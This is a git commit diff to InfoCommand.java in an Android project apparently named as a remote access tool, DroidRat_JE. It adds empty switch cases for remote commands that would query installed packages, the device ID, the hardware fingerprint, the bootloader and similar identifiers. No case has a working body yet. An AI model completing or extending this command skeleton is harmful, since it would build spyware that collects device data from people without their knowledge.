f83cab87b2dff41b4e21651f2a20a6088ba93e83
JE-Chen <zenmailman@gmail.com>
2020-11-07 23:50:42 +0800

    change InfoCommand
    to do complete InfoCommand

--- DroidRat_JE/app/src/main/java/com/je_chen/droidrat_je/command/InfoCommand.java
+++ DroidRat_JE/app/src/main/java/com/je_chen/droidrat_je/command/InfoCommand.java
@@ -2,7 +2,6 @@ package com.je_chen.droidrat_je.command;
 
 import android.content.Context;
 import android.content.pm.PackageManager;
-import android.util.Log;
 
 import com.je_chen.droidrat_je.command.process_super.CommandFather;
 import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
@@ -15,8 +14,8 @@ public class InfoCommand extends CommandFather implements CommandProcessInterfac
 
     private GetPackagesInfo getPackagesInfo;
 
-    public InfoCommand(PackageManager packageManager, Context context){
-        getPackagesInfo = new GetPackagesInfo(packageManager,context);
+    public InfoCommand(PackageManager packageManager, Context context) {
+        getPackagesInfo = new GetPackagesInfo(packageManager, context);
     }
 
     @Override
@@ -29,6 +28,54 @@ public class InfoCommand extends CommandFather implements CommandProcessInterfac
         try {
             String[] rawCommandArray = command.split(" ");
             switch (rawCommandArray[1]) {
+
+                case "ResolveInfo":
+                    break;
+
+                case "InstalledPackages":
+                    break;
+
+                case "AnotherPermission":
+                    break;
+
+                case "AnotherSignature":
+                    break;
+
+                case "PackageInfo":
+                    break;
+
+                case "ApplicationIcon":
+                    break;
+
+                case "DeviceId":
+                    break;
+
+                case "BOARD":
+                    break;
+
+                case "BOOTLOADER":
+                    break;
+
+                case "BRAND":
+                    break;
+
+                case "Device":
+                    break;
+
+                case "Display":
+                    break;
+
+                case "FINGERPRINT":
+                    break;
+
+                case "HARDWARE":
+                    break;
+
+                case "HOST":
+                    break;
+
+                case "ID":
+                    break;
 
             }
         } catch (Exception e) {
